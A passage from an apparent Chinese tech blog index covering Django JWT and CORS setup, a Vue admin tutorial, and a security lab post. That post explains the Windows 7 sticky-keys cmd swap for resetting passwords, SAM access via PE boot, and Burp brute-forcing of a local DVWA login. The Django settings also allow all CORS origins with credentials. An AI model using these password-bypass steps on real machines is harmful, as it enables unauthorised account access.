string">'HS256'</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#构造payload</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'user_id'</span><span class="token punctuation">:</span>userId<span class="token punctuation">,</span>        <span class="token string">'username'</span><span class="token punctuation">:</span>username<span class="token punctuation">,</span>        <span class="token string">'exp'</span><span class="token punctuation">:</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#超时时间</span>    <span class="token punctuation">}</span>    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token operator">=</span>payload<span class="token punctuation">,</span>key<span class="token operator">=</span>salt<span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">return</span> token</code></pre><p><strong>校验token</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">checkToken</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        token <span class="token operator">=</span> request<span class="token punctuation">.</span>META<span class="token punctuation">[</span><span class="token string">'HTTP_COOKIE'</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#获取http请求头，请求将token放入cookie字段中</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> JsonResponse<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'ret'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'msg'</span><span class="token punctuation">:</span><span class="token string">'无token信息'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">''' 1.切割        2.解密        3.验证第三段的合法性'''</span>    <span class="token comment" spellcheck="true"># print("token1",token)</span>    tokenList <span class="token operator">=</span> token<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    token <span class="token operator">=</span> tokenList<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    salt <span class="token operator">=</span> settings<span class="token punctuation">.</span>SECRET_KEY    <span class="token comment" spellcheck="true"># print("token",token)</span>    verifiedPayload <span class="token operator">=</span> None    <span class="token keyword">try</span><span class="token punctuation">:</span>        verifiedPayload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> salt<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token string">"HS256"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print("verified",verifiedPayload)</span>    <span class="token keyword">except</span> exceptions<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token number">1</span>   <span class="token comment" spellcheck="true">#token已失效</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'flag'</span><span class="token punctuation">:</span>flag<span class="token punctuation">}</span>    <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>DecodeError<span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token number">2</span>   <span class="token comment" spellcheck="true">#token认证失败</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'flag'</span><span class="token punctuation">:</span>flag<span class="token punctuation">}</span>    <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>InvalidTokenError<span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token number">3</span>   <span class="token comment" spellcheck="true">#非法的token</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'flag'</span><span class="token punctuation">:</span>flag<span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token operator">not</span> verifiedPayload<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#校验失败</span>        flag <span class="token operator">=</span> <span class="token number">4</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'flag'</span><span class="token punctuation">:</span>flag<span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'flag'</span><span class="token punctuation">:</span>flag<span class="token punctuation">,</span><span class="token string">'payload'</span><span class="token punctuation">:</span>verifiedPayload<span class="token punctuation">}</span></code></pre><h2 id="关闭Django跨域"><a href="#关闭Django跨域" class="headerlink" title="关闭Django跨域"></a>关闭Django跨域</h2><p>基于前后端分离的框架，前端向Django发送http请求前，需要关闭Django跨域，否则会出错。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>pip install django-cors-headers</code></pre><p><strong>settings.py</strong></p><pre class=" language-python"><code class="language-python">INSTALLED_APPS <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'corsheaders'</span>， <span class="token punctuation">]</span> MIDDLEWARE_CLASSES <span class="token operator">=</span> <span class="token punctuation">(</span>    <span class="token string">'corsheaders.middleware.CorsMiddleware'</span><span class="token punctuation">,</span>    <span class="token string">'django.middleware.common.CommonMiddleware'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># 注意顺序</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#跨域增加忽略</span>CORS_ALLOW_CREDENTIALS <span class="token operator">=</span> <span class="token boolean">True</span>CORS_ORIGIN_ALLOW_ALL <span class="token operator">=</span> <span class="token boolean">True</span>CORS_ORIGIN_WHITELIST <span class="token operator">=</span> <span class="token punctuation">(</span>    <span class="token string">'*'</span><span class="token punctuation">)</span>CORS_ALLOW_METHODS <span class="token operator">=</span> <span class="token punctuation">(</span>    <span class="token string">'DELETE'</span><span class="token punctuation">,</span>    <span class="token string">'GET'</span><span class="token punctuation">,</span>    <span class="token string">'OPTIONS'</span><span class="token punctuation">,</span>    <span class="token string">'PATCH'</span><span class="token punctuation">,</span>    <span class="token string">'POST'</span><span class="token punctuation">,</span>    <span class="token string">'PUT'</span><span class="token punctuation">,</span>    <span class="token string">'VIEW'</span><span class="token punctuation">,</span><span class="token punctuation">)</span>CORS_ALLOW_HEADERS <span class="token operator">=</span> <span class="token punctuation">(</span>    <span class="token string">'XMLHttpRequest'</span><span class="token punctuation">,</span>    <span class="token string">'X_FILENAME'</span><span class="token punctuation">,</span>    <span class="token string">'accept-encoding'</span><span class="token punctuation">,</span>    <span class="token string">'authorization'</span><span class="token punctuation">,</span>    <span class="token string">'content-type'</span><span class="token punctuation">,</span>    <span class="token string">'dnt'</span><span class="token punctuation">,</span>    <span class="token string">'origin'</span><span class="token punctuation">,</span>    <span class="token string">'user-agent'</span><span class="token punctuation">,</span>    <span class="token string">'x-csrftoken'</span><span class="token punctuation">,</span>    <span class="token string">'x-requested-with'</span><span class="token punctuation">,</span>    <span class="token string">'Pragma'</span><span class="token punctuation">,</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Python </tag>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码破解</title>
      <link href="/2021/01/07/cypher1/"/>
      <url>/2021/01/07/cypher1/</url>
      
        <content type="html"><![CDATA[<h2 id="利用系统漏洞破解密码"><a href="#利用系统漏洞破解密码" class="headerlink" title="利用系统漏洞破解密码"></a>利用系统漏洞破解密码</h2><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>在不知道Win7系统密码的情况下破解密码</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Win7系统下5次shift键可调用一个粘滞键，粘滞键的可执行文件存在于c:\windows\system32\sethc.exe,即可以在账户未登录的情况下调用内部程序，我们的目的在于把此程序换掉包成cmd程序，进而进行密码破解。(未登录时执行cmd是以system权限打开的)</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol><li><p>启动Windows 7的修复模式(在开机的过程中强制关机即可触发该模式)。<br><img src="https://pic.downk.cc/item/5e8addc3504f4bcb04f30027.png" alt=""><br><img src="https://pic.downk.cc/item/5e8addd8504f4bcb04f31395.png" alt=""></p></li><li><p>利用反馈问题的链接打开内部文件<br><img src="https://pic.downk.cc/item/5e8adde9504f4bcb04f321f4.png" alt=""><br><img src="https://pic.downk.cc/item/5e8addfd504f4bcb04f33387.png" alt=""><br><img src="https://pic.downk.cc/item/5e8ade0d504f4bcb04f3417f.png" alt=""></p></li><li><p>找到windows文件夹所在的磁盘(注意要显示所有文件)，找到粘滞键的可执行文件，重命名。复制cmd的执行文件，重命名cmd副本为sethc(粘滞键可执行文件名称)。</p></li><li><p>重新开启计算机，按下shift键5次，此时调用的为cmd可执行文件。</p></li><li><p>在cmd中执行用户密码重置命令，即可登录账户。(可用双引号””代替新密码，即可不输入登录账户)</p></li></ol><blockquote><p>注：少数版本的Win7没有修复模式</p></blockquote><h2 id="利用PE破解密码"><a href="#利用PE破解密码" class="headerlink" title="利用PE破解密码"></a>利用PE破解密码</h2><h3 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h3><p>从c:\windows\system32\config\SAM文件中获取用户密码</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li>PE是一个微型维修操作系统，不同的操作系统版本对应不同的PE，PE是装在U盘中进行使用的。</li><li>SAM文件中装的是哈希值且无法打开(操作系统开机状态全过程中SAM禁止访问)</li><li>正常的计算机开机是从硬盘引导，我们将其改成从U盘引导，此时U盘里有PE操作系统，就不会继续再读计算机硬盘里的操作系统。这样一来我们的U盘相当于计算机硬盘，而计算机本身的硬盘则相当于移动硬盘(U盘)，此时我们的PE操作系统就可以访问计算机硬盘中的SAM文件</li></ul><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ol><li>插入U盘进入BOIS模式</li><li>选择破解密码</li></ol><h2 id="在kali中搭建DVWA"><a href="#在kali中搭建DVWA" class="headerlink" title="在kali中搭建DVWA"></a>在kali中搭建DVWA</h2><ol><li>下载dvwa：</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/ethicalhack3r/DVWA</code></pre><ol start="2"><li><p>下载完成后可直接在/var/www/html找到DVWA文件夹(若找不到则将DVWA直接移到该文件夹下)</p></li><li><p>进入到/var/www/html中，并修改权限</p></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">chmod</span> 777 -R DVWA/</code></pre><ol start="4"><li>启动mysql/apache服务</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">service</span> mysql start<span class="token function">service</span> apache2 start</code></pre><ol start="5"><li>查看服务是否开启</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">netstat</span> -anpt <span class="token operator">|</span> <span class="token function">grep</span> 80  <span class="token comment" spellcheck="true">#apache</span><span class="token function">netstat</span> -anpt <span class="token operator">|</span> <span class="token function">grep</span> 3306 <span class="token comment" spellcheck="true">#mysql</span></code></pre><ol start="6"><li>登录myslq进行授权</li></ol><pre class=" language-bash"><code class="language-bash">mysql -u root<span class="token operator">></span>create database dvwa<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">#一定要有引号</span><span class="token operator">></span>show databases<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">#查看数据库</span><span class="token operator">></span>grant all privileges on *.* to dvwa@127.0.0.1 identified by <span class="token string">"123"</span></code></pre><ul><li>all :所有权限</li><li>. :给所有数据库all的权限</li><li>dvwa: 用户名</li><li>127.0.0.1:dvwa搭建的地址</li><li>123:密码，可自行设置</li></ul><ol start="7"><li>进入到dvwa的目录,并执行以下命令</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> config<span class="token function">cp</span> config.inc.php.dist config.inc.php vim config.inc.php</code></pre><ol start="8"><li>修改config.inc.php的内容,修改为刚刚设置的内容</li></ol><pre class=" language-bash"><code class="language-bash">DVWA<span class="token punctuation">[</span><span class="token string">'db_user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> dvwaDVWA<span class="token punctuation">[</span><span class="token string">'db_password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> 123 </code></pre><ol start="9"><li>通过浏览器输入127.0.0.1/DVWA来进行访问，默认用户名密码是admin@password</li></ol><h2 id="利用BurpSuite进行爆破"><a href="#利用BurpSuite进行爆破" class="headerlink" title="利用BurpSuite进行爆破"></a>利用BurpSuite进行爆破</h2><p>使用burp suite对本机DVWA进行密码爆破</p><h3 id="浏览器设置代理"><a href="#浏览器设置代理" class="headerlink" title="浏览器设置代理"></a>浏览器设置代理</h3><p><img src="https://pic.downk.cc/item/5ed5ea5fc2a9a83be54b8afb.png" alt=""><br>在搜索栏搜索proxy,打开Network Proxy：<br><img src="https://pic.downk.cc/item/5ed5eb22c2a9a83be54c80ef.png" alt=""></p><h3 id="拦截测试"><a href="#拦截测试" class="headerlink" title="拦截测试"></a>拦截测试</h3><ol><li><p>设置target<br><img src="https://pic.downk.cc/item/5ed6075cc2a9a83be57135ea.png" alt=""></p></li><li><p>开启BP的proxy模块<br><img src="https://pic.downk.cc/item/5ed5eba9c2a9a83be54d3e58.png" alt=""></p></li><li><p>打开火狐浏览器的本地代理设置，在浏览器搜索栏输入：</p></li></ol><pre class=" language-bash"><code class="language-bash">about:config搜索：network.proxy.allow_hijacking_localhost 将其布尔值改为True</code></pre><ol start="4"><li>在DVWA网页中随意输入用户名密码进行测试,发现BP中拦截到如下图所示http请求<br><img src="https://pic.downk.cc/item/5ed5fb09c2a9a83be562d2e9.png" alt=""></li></ol><h3 id="开始爆破"><a href="#开始爆破" class="headerlink" title="开始爆破"></a>开始爆破</h3><ol><li><p>选择BP拦截到的有用户名和密码的一行，右键点击该行，选择send to intruder<br><img src="https://pic.downk.cc/item/5ed5fdfbc2a9a83be56696ad.png" alt=""></p></li><li><p>选择intruder-&gt;position进行设置，选择clean清除所有payload,选择要进行爆破的地方点击add<br><img src="https://pic.downk.cc/item/5ed602f5c2a9a83be56cbc38.png" alt=""></p></li><li><p>选择payload3,进行登录操作<br><img src="https://pic.downk.cc/item/5ed6044ec2a9a83be56e3677.png" alt=""></p></li><li><p>设置payload1,点击load,加载kali默认的用户名字典：/usr/share/wordlists/metasploit,选择任意一个文件加进去。</p></li><li><p>设置payload2,点击load,加载kali默认的用户名字典：/usr/share/wordlists/metasploit,选择任意一个文件加进去(名字中带有pass的)。</p></li><li><p>设置选项，避免出问题<br><img src="https://pic.downk.cc/item/5ed608d0c2a9a83be5731486.png" alt=""></p></li><li><p>选择右上角start attack<br><img src="https://pic.downk.cc/item/5ed613c4c2a9a83be57d97cf.png" alt=""></p></li></ol><h3 id="绕过验证码"><a href="#绕过验证码" class="headerlink" title="绕过验证码"></a>绕过验证码</h3><h4 id="安装reCAPTCHA"><a href="#安装reCAPTCHA" class="headerlink" title="安装reCAPTCHA"></a>安装reCAPTCHA</h4><ol><li>在kali中输入以下命令:</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/bit4woo/reCAPTCHA.git</code></pre><ol start="2"><li>在BP中装入插件<br><img src="https://pic.downk.cc/item/5ed67258c2a9a83be500e818.png" alt=""></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue2</title>
      <link href="/2020/12/27/vue2/"/>
      <url>/2020/12/27/vue2/</url>
      
        <content type="html"><![CDATA[<h2 id="电商后台管理系统的功能"><a href="#电商后台管理系统的功能" class="headerlink" title="电商后台管理系统的功能"></a>电商后台管理系统的功能</h2><p><img src="https://pic.downk.cc/item/5fe83a303ffa7d37b3bfa62c.png" alt=""></p><h2 id="电商后台管理系统的开发模式（前后端分离）"><a href="#电商后台管理系统的开发模式（前后端分离）" class="headerlink" title="电商后台管理系统的开发模式（前后端分离）"></a>电商后台管理系统的开发模式（前后端分离）</h2><p>电商后台管理模式整体采用前后端分离的开发模式，其中前端项目是基于Vue技术栈的SPA项目</p><p><img src="https://pic.downk.cc/item/5fe83ad63ffa7d37b3bff9ae.png" alt=""></p><h2 id="项目初始化"><a href="#项目初始化" class="headerlink" title="项目初始化"></a>项目初始化</h2><h3 id="修改代理加快速度"><a href="#修改代理加快速度" class="headerlink" title="修改代理加快速度"></a>修改代理加快速度</h3><p>修改npm代理加快连接速度</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npm.taobao.org</code></pre><h3 id="前端项目初始化步骤"><a href="#前端项目初始化步骤" class="headerlink" title="前端项目初始化步骤"></a>前端项目初始化步骤</h3><h4 id="1-安装脚手架"><a href="#1-安装脚手架" class="headerlink" title="1.安装脚手架"></a>1.安装脚手架</h4><p>先卸载原有Vue，更新版本</p><pre class=" language-sh"><code class="language-sh">npm uninstall vue-cli -g</code></pre><blockquote><p>npm命令通过安装Node.js包就可获得</p></blockquote><p>再重新安装使用</p><pre class=" language-sh"><code class="language-sh">npm install @vue/cli -g </code></pre><h4 id="2-通过Vue脚手架创建项目-3-配置Vue路由"><a href="#2-通过Vue脚手架创建项目-3-配置Vue路由" class="headerlink" title="2.通过Vue脚手架创建项目/3.配置Vue路由"></a>2.通过Vue脚手架创建项目/3.配置Vue路由</h4><h5 id="可视化创建"><a href="#可视化创建" class="headerlink" title="可视化创建"></a>可视化创建</h5><p><img src="https://pic.downk.cc/item/5fe843283ffa7d37b3c3fa54.png" alt=""></p><p>访问localhost:8000,得到以下页面，此页面用于可视化创建项目</p><p><img src="https://pic.downk.cc/item/5fe8436d3ffa7d37b3c4185a.png" alt=""></p><h5 id="vue项目基本信息填写"><a href="#vue项目基本信息填写" class="headerlink" title="vue项目基本信息填写"></a>vue项目基本信息填写</h5><p>点击创建，自己选择Vue项目的存储路径</p><p><img src="https://pic.downk.cc/item/5fe844403ffa7d37b3c490e6.png" alt=""></p><p>点击最下方创建新项目</p><p><img src="https://pic.downk.cc/item/5fe844c33ffa7d37b3c4d24d.png" alt=""></p><p>预设可根据自己的需求进行选择，这里选择手动的方式</p><h5 id="功能安装"><a href="#功能安装" class="headerlink" title="功能安装"></a>功能安装</h5><p>功能可根据自己需求选择性安装</p><p><img src="https://pic.downk.cc/item/5fe845ca3ffa7d37b3c5617c.png" alt=""></p><blockquote><p>Bable功能为必须安装的选项，使用配置文件为强烈推荐安装的选项,eslint初学者可选择不安装</p></blockquote><h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><p><img src="https://pic.downk.cc/item/5fe846bc3ffa7d37b3c5e0ca.png" alt=""></p><h5 id="保存预设"><a href="#保存预设" class="headerlink" title="保存预设"></a>保存预设</h5><p><img src="https://pic.downk.cc/item/5fe8474a3ffa7d37b3c62def.png" alt=""></p><h4 id="4-添加插件"><a href="#4-添加插件" class="headerlink" title="4.添加插件"></a>4.添加插件</h4><p><img src="https://pic.downk.cc/item/5fe986a33ffa7d37b3afee48.png" alt=""></p><h5 id="element-ui"><a href="#element-ui" class="headerlink" title="element-ui"></a>element-ui</h5><p><img src="https://pic.downk.cc/item/5fe986f03ffa7d37b3b0704d.png" alt=""></p><p><img src="https://pic.downk.cc/item/5fe987b43ffa7d37b3b1c416.png" alt=""></p><h4 id="5-配置axios库"><a href="#5-配置axios库" class="headerlink" title="5.配置axios库"></a>5.配置axios库</h4><p>axios库支持在项目中发送网络请求</p><p><img src="https://pic.downk.cc/item/5fe9881b3ffa7d37b3b26114.png" alt=""></p><p><img src="https://pic.downk.cc/item/5fe988613ffa7d37b3b2caa5.png" alt=""></p><h4 id="6-初始化git远程仓库-7-将本地项目部署到github中"><a href="#6-初始化git远程仓库-7-将本地项目部署到github中" class="headerlink" title="6.初始化git远程仓库/7.将本地项目部署到github中"></a>6.初始化git远程仓库/7.将本地项目部署到github中</h4><p>详情参考本博客github篇</p><h4 id="7-使用新的分支"><a href="#7-使用新的分支" class="headerlink" title="7.使用新的分支"></a>7.使用新的分支</h4><p>开发一个新的功能建议使用新的分支，如登录功能</p><p><img src="https://pic.downk.cc/item/5fec1ff73ffa7d37b325537f.png" alt=""></p><h4 id="8-项目预览"><a href="#8-项目预览" class="headerlink" title="8.项目预览"></a>8.项目预览</h4><p><img src="https://pic.downk.cc/item/5fec21223ffa7d37b3279c2f.png" alt=""></p><p>或使用命令在该项目文件的根目录下运行以下命令</p><pre class=" language-sh"><code class="language-sh">npm installnpm run serve</code></pre><h4 id="9-寻找入口点"><a href="#9-寻找入口点" class="headerlink" title="9.寻找入口点"></a>9.寻找入口点</h4><p>整个vue-cli项目的入口点在src-&gt;main.js文件，初始化为以下代码：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App.vue'</span><span class="token keyword">import</span> router <span class="token keyword">from</span> <span class="token string">'./router'</span><span class="token keyword">import</span> <span class="token string">'./plugins/element.js'</span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  router<span class="token punctuation">,</span>  render<span class="token punctuation">:</span> h <span class="token operator">=</span><span class="token operator">></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将App根组件渲染到页面上，第8步种预览的页面即为App根组件的内容</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">$mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span></code></pre><h2 id="json-server"><a href="#json-server" class="headerlink" title="json-server"></a>json-server</h2><p>搭建本地数据接口，创建json文件，便于前端调试调用。当后端接口还未开发结束时，前端可以使用json-server模拟后端API调用，获取动态数据对前端进行调试。</p><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h3><p>全局安装json-server</p><pre class=" language-shell"><code class="language-shell">npm install -g json-server</code></pre><h3 id="2-创建一个db-json的文件"><a href="#2-创建一个db-json的文件" class="headerlink" title="2. 创建一个db.json的文件"></a>2. 创建一个db.json的文件</h3><p>first/second/third代表三张表，表里的是属于这张表的每一条记录</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"first"</span><span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"zby"</span><span class="token punctuation">,</span><span class="token property">"age"</span><span class="token operator">:</span><span class="token number">21</span><span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"second"</span><span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"bzy"</span><span class="token punctuation">,</span><span class="token property">"age"</span><span class="token operator">:</span><span class="token number">17</span><span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"third"</span><span class="token operator">:</span><span class="token punctuation">[</span>        <span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"yzb"</span><span class="token punctuation">,</span><span class="token property">"age"</span><span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>任意寻找一个路径存放db.json文件即可，建议存放在前端项目的文件夹中</p><h3 id="3-开启JSON服务"><a href="#3-开启JSON服务" class="headerlink" title="3. 开启JSON服务"></a>3. 开启JSON服务</h3><p>在2步中存放db.json的文件目录下打开cmd,执行以下命令</p><pre class=" language-sh"><code class="language-sh">json-server --watch db.json</code></pre><blockquote><p>–watch是监听db.json的改动，进而更新服务器数据</p></blockquote><p><img src="https://pic.downk.cc/item/5feae55f3ffa7d37b3568a89.png" alt=" "></p><p>访问对应的url即可获得该表的信息：</p><p><img src="https://pic.downk.cc/item/5feae5ce3ffa7d37b3575144.png" alt=""></p><h3 id="4-增加表中数据"><a href="#4-增加表中数据" class="headerlink" title="4.增加表中数据"></a>4.增加表中数据</h3><p>增加表中数据可以通过直接修改db.json文件或使用Post请求进行添加</p><h2 id="登录-退出功能"><a href="#登录-退出功能" class="headerlink" title="登录/退出功能"></a>登录/退出功能</h2><h3 id="登录概述"><a href="#登录概述" class="headerlink" title="登录概述"></a>登录概述</h3><h4 id="登录业务流程"><a href="#登录业务流程" class="headerlink" title="登录业务流程"></a>登录业务流程</h4><ul><li>①在登录页面输入用户名和密码</li><li>②调用后台接口进行验证</li><li>③通过验证后，根据后台的响应状态跳转到项目主页</li></ul><h4 id="登录业务技术点"><a href="#登录业务技术点" class="headerlink" title="登录业务技术点"></a>登录业务技术点</h4><ul><li>http是无状态的</li><li>通过cookie在客户端记录状态</li><li>通过session在服务器端记录状态</li><li>通过tooken方式维持状态</li></ul><blockquote><p>有两种记录状态的方式，第一种是结合cookie和session,第二种是tooken；如果前后端之间存在跨域问题，使用tooken方式，否则使用cookie结合session。</p></blockquote><h3 id="登录-token原理分析"><a href="#登录-token原理分析" class="headerlink" title="登录-token原理分析"></a>登录-token原理分析</h3><p><img src="https://pic.downk.cc/item/5feaf87b3ffa7d37b37c616a.png" alt=""></p><h3 id="登录功能的实现"><a href="#登录功能的实现" class="headerlink" title="登录功能的实现"></a>登录功能的实现</h3><h4 id="项目梳理"><a href="#项目梳理" class="headerlink" title="项目梳理"></a>项目梳理</h4><h5 id="1-梳理根组件"><a href="#1-梳理根组件" class="headerlink" title="1.梳理根组件"></a>1.梳理根组件</h5><p>将App.vue中的相关内容进行清空，最终为以下状态</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'app'</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><h5 id="2-梳理路由"><a href="#2-梳理路由" class="headerlink" title="2.梳理路由"></a>2.梳理路由</h5><p>将src-&gt;router-&gt;index.js(router.js)文件相关内容进行清空，最终为以下状态</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> VueRouter <span class="token keyword">from</span> <span class="token string">'vue-router'</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>VueRouter<span class="token punctuation">)</span><span class="token keyword">const</span> routes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  routes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">default</span> router</code></pre><h5 id="3-删除无用文件"><a href="#3-删除无用文件" class="headerlink" title="3.删除无用文件"></a>3.删除无用文件</h5><p>将components-&gt;HelloWorld.vue，以及views-&gt;About.vue/Home.vue删除</p><h4 id="渲染login组件并实现重定向"><a href="#渲染login组件并实现重定向" class="headerlink" title="渲染login组件并实现重定向"></a>渲染login组件并实现重定向</h4><h5 id="1-新建components-gt-login-vue文件"><a href="#1-新建components-gt-login-vue文件" class="headerlink" title="1. 新建components-&gt;login.vue文件"></a>1. 新建components-&gt;login.vue文件</h5><p>其中style要加上scoped关键字，scoped表示当前样式只在当前组件中生效</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">src</span><span class="token 